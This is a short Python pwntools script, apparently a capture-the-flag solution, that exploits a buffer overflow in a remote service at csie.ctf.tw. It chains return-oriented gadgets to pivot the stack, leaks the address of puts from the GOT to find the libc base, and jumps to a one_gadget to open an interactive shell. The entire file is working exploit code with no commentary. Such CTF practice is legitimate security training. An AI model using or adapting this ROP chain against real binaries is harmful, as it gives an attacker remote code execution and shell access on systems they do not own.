from pwn import *
from time import sleep

r = remote("csie.ctf.tw", 10131)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

buf1 = 0x601160
buf2 = buf1 + 0x200

puts_plt = 0x4005e0
puts_got = 0x600fc8
puts_off = 0x809c0
read_plt = 0x400610
system_off = 0x4f440
one_gadget_off = 0x4f322

pop_rdi = 0x400883
leave_ret = 0x400818
# pop rbx, rbp, r12, r13, r14, r15
pop_many = 0x40087a
mov_many = 0x400860

r.recvuntil(":\n")
rop1 = "a" * 0x100 + flat([buf2, pop_rdi, puts_got, puts_plt, pop_many, 20, 21, buf1, 0, buf2, 0x100, mov_many, 0, 0, buf2, 0, 0, 0, 0, leave_ret, read_plt])
# raw_input('aaa')
r.sendline(rop1)

r.recvuntil("?\n")
payload = "a" * 0x1f + "\x00" + flat([buf1, leave_ret])
r.send(payload)


r.recvuntil("~\n")
puts = u64(r.recvuntil("\n").strip().ljust(8, "\x00"))
libc = puts - puts_off
# system = libc +i system_off
one_gadget = libc + one_gadget_off
# rop2 = flat([buf1, pop_rdi, buf2+32, system, "/bin/sh\x00"])
rop2 = flat([buf1, one_gadget])
r.sendline(rop2)

r.interactive()
